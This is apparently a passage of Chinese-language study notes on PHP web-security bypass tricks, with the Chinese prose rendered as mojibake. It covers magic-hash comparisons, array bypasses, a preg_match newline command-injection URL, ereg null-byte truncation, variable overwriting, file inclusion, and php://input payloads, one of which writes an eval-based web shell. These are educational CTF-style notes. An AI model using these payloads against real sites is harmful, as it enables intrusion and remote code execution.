title="boolç±»å‹æ¯”è¾ƒ"></a>boolç±»å‹æ¯”è¾ƒ</h4><p>boolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦èƒ½å¤Ÿå¼±ç±»å‹ç›¸ç­‰</p><h4 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h4><p>1.md5()ç»•è¿‡<code>==</code></p><p> PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šé¢ä¸¤ä¸ªå€¼å¯ä»¥ä½¿md5()çš„å¼€å¤´ä¸º0eï¼Œç»è¿‡<code>==</code>å¼±ç±»å‹æ¯”è¾ƒå¯è¾“å‡ºâ€˜yesâ€™ï¼Œä½†æ²¡æ³•ç»è¿‡<code>===</code></p><p>ç»å¸¸ä½¿ç”¨md5()å¼€å¤´ä¸ºâ€œ0eâ€çš„å­—ç¬¦ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token comment">//0e830400451993494058024219903391</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span><span class="token comment">//0e462097431906509019562988736854</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span><span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span><span class="token comment">//0e342768416822451524974117254469</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span><span class="token comment">//0e848240448830537924465865611904</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span><span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span><span class="token comment">//0e940624217856561557816327384675</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span><span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.md5([])ç»•è¿‡<code>===</code></p><p>å› ä¸ºmd5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œå› æ­¤åœ¨md5()é‡åˆ°æ•°ç»„æ—¶ä¼šè­¦å‘Šè€Œä¸”è¿”å›nullï¼Œç„¶è€Œèƒ½å¤Ÿå¿½ç•¥è­¦å‘Šå¹¶ç»è¿‡æ•°ç»„ç»•è¿‡<code>===</code>ï¼Œä»¥ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//bool(true)ï¼Œ@è¡¨ç¤ºå¿½ç•¥è­¦å‘Š</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ffifdyop</code>ï¼Œè¿™ä¸ªç‚¹çš„åŸç†æ˜¯ ffifdyop è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ or â€˜6ï¼Œ<br>è€Œ Mysql åˆšå¥½åˆä¼šå§ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯1select * from â€˜adminâ€™ where password=â€™â€™ or â€˜6xxxxxâ€™</p><p>ç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡md5()å‡½æ•°</p><h4 id="sha1-å‡½æ•°"><a href="#sha1-å‡½æ•°" class="headerlink" title="sha1()å‡½æ•°"></a>sha1()å‡½æ•°</h4><p>sha1()ä¸md5()åŸºæœ¬åŸç†ç›¸åŒï¼Œå› æ­¤æ­¤å¤„ä»…åˆ—å‡ºsha1()å¼€å¤´ä¸ºâ€œ0eâ€çš„å­—ç¬¦ä¸²ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span><span class="token comment">//0e66507019969427134894567494305185566735</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span><span class="token comment">//0e76658526655756207688271159624026011393</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span><span class="token comment">//0e89257456677279068558073954252716165668</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span><span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="strcmp-ã€strcasecmp-å‡½æ•°"><a href="#strcmp-ã€strcasecmp-å‡½æ•°" class="headerlink" title="strcmp()ã€strcasecmp()`å‡½æ•°"></a>strcmp()ã€strcasecmp()`å‡½æ•°</h4><ul><li><p><code>strcmp(string1, string2)</code>ã€<code>strcasecmp(string1, string2)</code></p><p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå‰è€…ä¸åŒºåˆ†å¤§å°å†™ï¼Œåè€…åŒºåˆ†å¤§å°å†™ã€‚è‹¥<code>string1 &gt; string2</code>ï¼Œè¿”å›<code>&gt; 0</code>ï¼›è‹¥<code>string1 &lt; string2</code>ï¼Œè¿”å›<code>&lt; 0</code>;è‹¥<code>string1 = string2</code>ï¼Œè¿”å›<code>0</code>ã€‚ç„¶è€Œè¯¥å‡½æ•°æ²¡æ³•å¤„ç†æ•°ç»„ï¼Œå½“å‡ºç°æ•°ç»„æ—¶ï¼Œè¿”å›<code>null</code>ã€‚(ä¸‹ä¾‹ä¸­@è¡¨ç¤ºå¿½ç•¥è­¦å‘Š)</p><pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));//NULLvar_dump(@strcmp([],'flag') == 0);//bool(true)var_dump(@strcmp([],'flag') === 0);//bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h4></li></ul><p><code>intval()</code> åœ¨è½¬æ¢çš„æ—¶å€™ï¼Œä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ï¼Œ<code>intval()</code> ä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å› 0ã€‚</p><pre class="line-numbers language-none"><code class="language-none">var_dump(intval('2')) // 2var_dump(intval('3abcd')) // 3var_dump(intval('abcd')) // 0var_dump(0 == '0'); // truevar_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // falsevar_dump(1 == '1abcdef'); // trueif(intval($a) &gt; 1000) {    mysql_query("select * from news where id=".$a)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>trim å‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ \n\r\t\v\0ï¼Œä½†ä¸ä¼šè¿‡æ»¤è¿‡æ»¤\f</p><pre class="line-numbers language-none"><code class="language-none">$a = "  \n\r\t\v\0abc  \f";var_dump(trim($a)); // abc  \f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><p>å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™å­¦ä¹ å­¦ä¹ æ­£åˆ™[regex]:(<a href="https://regexr.com/">https://regexr.com/</a>)</p><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>preg_match å‡½æ•°ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œè¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ï¼Œå®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…åå°†ä¼šåœæ­¢æœç´¢ã€‚å¦‚æœåœ¨è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™ï¼Œæ²¡æœ‰é™åˆ¶å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸ(<code>^</code> å’Œ <code>$</code>)ï¼Œåˆ™å¯ä»¥å­˜åœ¨ç»•è¿‡çš„é—®é¢˜</p><pre class="line-numbers language-none"><code class="language-none">$ip = '1.1.1.1 abcd'; // å¯ä»¥ç»•è¿‡if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {  die('error');} else {  // echo('key...')}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pre_match åœ¨åŒ¹é…çš„æ—¶å€™ä¼šæ¶ˆè€—è¾ƒå¤§çš„èµ„æºï¼Œå¹¶ä¸”é»˜è®¤å­˜åœ¨è´ªå©ªåŒ¹é…ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼Œä¼šå¯¼è‡´ pre_match æ¶ˆè€—å¤§é‡èµ„æºä»è€Œå¯¼è‡´ php è¶…æ—¶ï¼Œåé¢çš„ php è¯­å¥å°±ä¸ä¼šæ‰§è¡Œã€‚payload:</p><pre class="line-numbers language-none"><code class="language-none">$code="xdsec###AAAAAAAAAAAAAAAAAAA(è¶…å¤šä¸ªA)";preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $code));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å°±æ˜¯åŒ¹é…æ–‡ä»¶åç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€ç ´åˆ™å·ã€æ–œæ ã€ç©ºç™½å­—ç¬¦å„ç§ç»„åˆçš„å¹¶ä¸”åç¼€åæ˜¯rptçš„æ–‡ä»¶ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå°±æ‰§è¡Œç³»ç»Ÿå‘½ä»¤fileæ‰“å°æ–‡ä»¶çš„ç±»å‹å’Œç¼–ç ä¿¡æ¯ï¼Œå¦‚æœåŒ¹é…å¤±è´¥å°±æ‰“å°â€™regex failedâ€™.</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>å¦‚æœå¼€å¯äº†/mï¼Œä¼šå­˜åœ¨ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$file_name=$_GET['path'];if (!preg_match("/^[a-zA-Z0-9-s_]+.rpt$/m", $file_name)) {  echo "regex failed";} else {    echo exec("/usr/bin/file -i -b ".$file_name);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°æ­£åˆ™è¡¨è¾¾å¼ç»“å°¾çš„/m äº†ï¼Œåœ¨phpä¸­ï¼Œ/mè¡¨ç¤ºå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ï¼Œå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ä¹‹å<code>^</code>å’Œ<code>$</code>çš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œæ²¡å¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹å‰(å³å•è¡ŒåŒ¹é…æ¨¡å¼), <code>^</code> å’Œ<code>$</code> æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾ï¼Œå¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹åï¼Œå¤šè¡Œæ¨¡å¼<code>^</code>,<code>$</code>å¯ä»¥åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œæ‰€ä»¥ä¸Šè¿°payloadé‡Œé¢å«æœ‰æ¢è¡Œç¬¦ï¼Œè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œä¸€è¡ŒåŒ¹é…OKå³å¯ï¼Œæ‰€ä»¥è¿›å…¥äº†execæ‰§è¡Œåˆ†æ”¯ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>å¼€å¯/m</p><pre class="line-numbers language-none"><code class="language-none">^ è¡Œé¦–$ è¡Œå°¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸å¼€å¯/m</p><pre class="line-numbers language-none"><code class="language-none">^ å­—ç¬¦ä¸²çš„å¼€å§‹$ å­—ç¬¦ä¸²çš„ç»“å°¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¿®é¥°ç¬¦è¯´æ˜</p><pre class="line-numbers language-none"><code class="language-none">i åœ¨å’Œæ­£åˆ™åŒ¹é…æ˜¯ä¸åŒºåˆ†å¤§å°å†™ m å°†å­—ç¬¦ä¸²è§†ä¸ºå¤šè¡Œã€‚é»˜è®¤çš„æ­£åˆ™å¼€å§‹â€œ^â€å’Œç»“æŸâ€œ$â€å°†ç›®æ ‡å­—æ¡ä¸²ä½œä¸ºä¸€å•ä¸€çš„ä¸€â€œè¡Œâ€å­—ç¬¦ï¼ˆç”šè‡³å…¶ä¸­åŒ…æ‹¬æ¢è¡Œç¬¦ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ã€‚å¦‚æœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Šâ€œmâ€ï¼Œé‚£ä¹ˆå¼€å§‹å’Œç»“æŸå°†ä¼šæŒ‡ç‚¹å­—ç¬¦ä¸²çš„æ¯ä¸€è¡Œçš„å¼€å¤´å°±æ˜¯â€œ^â€ç»“æŸå°±æ˜¯â€œ$â€ã€‚ o è¯„ä¼°è¡¨è¾¾å¼åªæœ‰ä¸€æ¬¡s å¦‚æœè®¾å®šäº†è¿™ä¸ªä¿®æ­£ç¬¦ï¼Œé‚£ä¹ˆï¼Œè¢«åŒ¹é…çš„å­—ç¬¦ä¸²å°†è§†ä¸ºä¸€è¡Œæ¥çœ‹ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ï¼Œæ¢è¡Œç¬¦å°†è¢«è§†ä¸ºæ™®é€šå­—ç¬¦ä¸²ã€‚ x å¿½ç•¥ç©ºç™½ï¼Œé™¤éè¿›è¡Œè½¬ä¹‰çš„ä¸è¢«å¿½ç•¥ã€‚ g åœ¨å…¨å±€èŒƒå›´å†…æ‰¾åˆ°æ‰€æœ‰åŒ¹é…cg å³ä½¿å…¨å±€åŒ¹é…å¤±è´¥ä¹Ÿå…è®¸æœç´¢ç»§ç»­<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h4><p>æ­£åˆ™è¡¨è¾¾å¼å…¨å±€åŒ¹é…ï¼ŒæˆåŠŸè¿”å›æ•´ä¸ªæ¨¡å¼åŒ¹é…çš„æ¬¡æ•°ï¼ˆå¯èƒ½ä¸ºé›¶ï¼‰ï¼Œå¦‚æœå‡ºé”™è¿”å› FALSE</p><h4 id="ereg-00-æˆªæ–­"><a href="#ereg-00-æˆªæ–­" class="headerlink" title="ereg %00 æˆªæ–­"></a>ereg %00 æˆªæ–­</h4><p>ereg è¯»åˆ° %00 çš„æ—¶å€™ï¼Œå°±æˆªæ­¢äº†</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php    if (ereg ("^[a-zA-Z]+$", $_GET['a']) === FALSE)  {        echo 'You password must be alphabet';    }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ <code>a=abcd%001234</code>ï¼Œå¯ä»¥ç»•è¿‡</p><h3 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p>extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php      $auth = '0';      // è¿™é‡Œå¯ä»¥è¦†ç›–$authçš„å˜é‡å€¼    extract($_GET);     if($auth == 1){          echo "private!";      } else{          echo "public!";      }  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h4><p>parse_str() çš„ä½œç”¨æ˜¯è§£æå­—ç¬¦ä¸²ï¼Œå¹¶æ³¨å†Œæˆå˜é‡ã€‚ä¸ parse_str() ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ mb_parse_str()ï¼Œparse_str å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ï¼Œå¦‚æœå‚æ•° str æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸã€‚</p><pre class="line-numbers language-none"><code class="language-none">//var.php?var=new  $var='init';  parse_str($_SERVER['QUERY_STRING']);// $var ä¼šå˜æˆ newecho $var;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å˜é‡è¦†ç›–-1"><a href="#å˜é‡è¦†ç›–-1" class="headerlink" title="$$ å˜é‡è¦†ç›–"></a>$$ å˜é‡è¦†ç›–</h4><p>å¦‚æœæŠŠå˜é‡æœ¬èº«çš„ key ä¹Ÿå½“å˜é‡ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº† <code>$$</code>ï¼Œå°±å¯èƒ½å­˜åœ¨é—®é¢˜ã€‚</p><pre class="line-numbers language-none"><code class="language-none">$_ = '_POST';// $$_ æ˜¯ç­‰äº $_POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¾‹å­</p><pre class="line-numbers language-none"><code class="language-none">// http://127.0.0.1/index.php?_CONFIG=123$_CONFIG['extraSecure'] = true; foreach(array('_GET','_POST') as $method) {    foreach($$method as $key=&gt;$value) {      // $key == _CONFIG      // $$key == $_CONFIG      // è¿™ä¸ªå‡½æ•°ä¼šæŠŠ $_CONFIG å˜é‡é”€æ¯      unset($$key);    }} if ($_CONFIG['extraSecure'] == false) {    echo 'flag {****}';}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ•°ç»„ç±»å‹æ•°æ®çš„è¦†ç›–</p><pre class="line-numbers language-none"><code class="language-none">// index.php?_SESSION[userinfo][id]=1&amp;_SESSION[userinfo][username]=adminforeach (array('_COOKIE','_POST','_GET') as $_request)  {    foreach ($$_request as $_key=&gt;$_value)      {        $$_key=  $_value;    }}echo $_SESSION["userinfo"]["id"];echo '&lt;br&gt;';echo $_SESSION["userinfo"]["username"];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯å¦‚æœåé¢æœ‰ <code>session_start()</code> ä¼šé‡æ–°åˆå§‹åŒ–ä¸Šé¢çš„ <code>$_SESSION</code> æ•°æ®ï¼Œå› æ­¤åˆè¢«è¿˜åŸå›å»ã€‚</p><h3 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™å››ä¸ªå‡½æ•°ä¼šå°†åŒ…å«çš„æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è§£æ</p><p>_onceè¡¨ç¤ºåŒåæ–‡ä»¶åªå¼•å…¥ä¸€æ¬¡ï¼Œincludeåœ¨å¼•å…¥ä¸å­˜æ–‡ä»¶æ—¶äº§ç”Ÿä¸€ä¸ªè­¦å‘Šä¸”è„šæœ¬è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œrequireåˆ™ä¼šå¯¼è‡´ä¸€ä¸ªè‡´å‘½æ€§é”™è¯¯ä¸”è„šæœ¬åœæ­¢æ‰§è¡Œã€‚<br>include()æ˜¯æœ‰æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œè€Œ require()åˆ™æ˜¯æ— æ¡ä»¶åŒ…å«å‡½æ•°<br>includeæœ‰è¿”å›å€¼ï¼Œè€Œrequireæ²¡æœ‰<br>ç†è®ºä¸Šæ¥è¯´ï¼šincludeå’Œrequireåé¢åŠ ä¸åŠ æ‹¬å·å¯¹æ‰§è¡Œç»“æœæ²¡æœ‰åŒºåˆ«ï¼Œä½†æ˜¯åŠ ä¸Šæ‹¬å·æ•ˆç‡è¾ƒä½ï¼Œæ‰€ä»¥åé¢èƒ½ä¸åŠ æ‹¬å·å°±ä¸åŠ æ‹¬å·ã€‚</p><p>å¯åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¡ä»¶ï¼š<br>1.include()ç­‰å‡½æ•°é€šè¿‡åŠ¨æ€å˜é‡æ–¹å¼å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶<br>2.ç”¨æˆ·å¯æ§åˆ¶è¯¥åŠ¨æ€å˜é‡</p><h3 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h3><p>æ¶‰åŠçš„ç›¸å…³åè®®ï¼š<code>file://</code>ã€<code>php://filter</code>ã€<code>php://input</code>ã€<code>zip://</code>ã€<code>compress.bzip2://</code>ã€<code>compress.zlib://</code>ã€<code>data://</code></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul><li><p>ç®€ä»‹<br><code>php://</code>:æ˜¯ä¸ªèƒ½å¤Ÿè®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚POSTè¯·æ±‚çš„çŠ¶å†µä¸‹ï¼Œæœ€å¥½ç”¨<code>php://input</code>æ¥ä»£æ›¿<code>$HTTP_RAW_POST_DATA</code>ï¼Œç”±äºä»–ä¸ä¾èµ–äºç‰¹å®šçš„<code>php.ini</code>æŒ‡ä»¤ï¼Œå¹¶ä¸”ï¼Œè¿™æ ·çš„çŠ¶å†µä¸‹<code>$HTTP_RAW_POST_DATA</code>é»˜è®¤æ²¡æœ‰å¡«å……ï¼Œæ¯”æ¿€æ´»<code>always_populate_raw_post_data</code>æ½œåœ¨é¡»è¦æ›´å°‘çš„å†…å­˜ï¼Œ<code>enctype="multipart/form-data"</code>çš„æ—¶å€™<code>php://input</code>æ˜¯æ— æ•ˆçš„ã€‚</p><p>ç®€å•ç†è§£ï¼šé™¤<code>enctype="multipart/form-data"</code>å¤–ï¼Œè·å–POSTæ•°æ®ï¼ˆå¯åšä¸ºphpä»£ç æ‰§è¡Œï¼‰ã€‚</p></li><li><p>ä½¿ç”¨æ¡ä»¶</p></li><li><p>èŒƒä¾‹</p><p>ç¯å¢ƒï¼š</p><pre class="line-numbers language-none"><code class="language-none">//input.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åº”ç”¨ï¼š</p><pre class="line-numbers language-none"><code class="language-none">//payload[GET DATA]:   input.php?file=php://input[POST DATA 1]:&lt;?php phpinfo();?&gt;[POST DATA 2]:&lt;?php system('ls');?&gt;[POST DATA 3]:&lt;?php fputs(fopen("shell.php","w"),'&lt;?php @eval($_POST[cmd]);?&gt;');?&gt;#æˆ‘æ²¡å†™å…¥æˆåŠŸï¼Œç¼˜ç”±å¾…æŸ¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:filter"></a>php:filter</h4></li><li><p>ä»‹ç»<br><code>php://filter</code> æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ 